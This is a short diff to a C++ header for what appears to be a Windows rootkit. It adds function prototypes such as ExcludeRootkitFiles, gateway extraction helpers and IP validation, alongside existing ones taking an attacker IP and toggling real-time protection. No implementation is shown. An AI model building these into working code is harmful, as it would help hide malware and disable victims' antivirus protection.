@@ -111,19 +111,24 @@ namespace GeneralHelpers {
     BOOL DoesPathEndWithFile(char* DirPath);
     HANDLE StartThread(PVOID ThreadAddress, PVOID ThreadParameters);
     ULONG CalculateAddressValue(char* IpAddress);
+    BOOL IsValidIp(char* Address);
 }
 
 namespace RootkitInstall {
+    DWORD ExcludeRootkitFiles();
     int VerifyDependencies(const char* AttackerIp);
     BOOL WINAPI CtrlHandler(DWORD ControlType);
     RETURN_LAST RealTime(BOOL IsDisable);
+    char* ExtractGateways(char* IpConfigOutput);
+    char* GetGatewayList();
 }
 
 namespace RequestHelpers {
     BOOL ValidateInfoTypeString(const char* InfoType);
     void LogMessage(const char* Message, LogFile* MediumLog, BOOL IsError, int ErrorCode);
     BOOL ShouldQuit();
-    int FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData, ULONG64* FileDataSize, BOOL IsWrite);
+    int FileOperation(char* FilePath, HANDLE* FileHandle, PVOID* FileData,
+        ULONG64* FileDataSize, BOOL IsWrite, BOOL ShouldNullTerm);
     ROOTKIT_UNEXERR ResolvePID(char* ModuleName, ULONG64* ProcessId);
 }
 
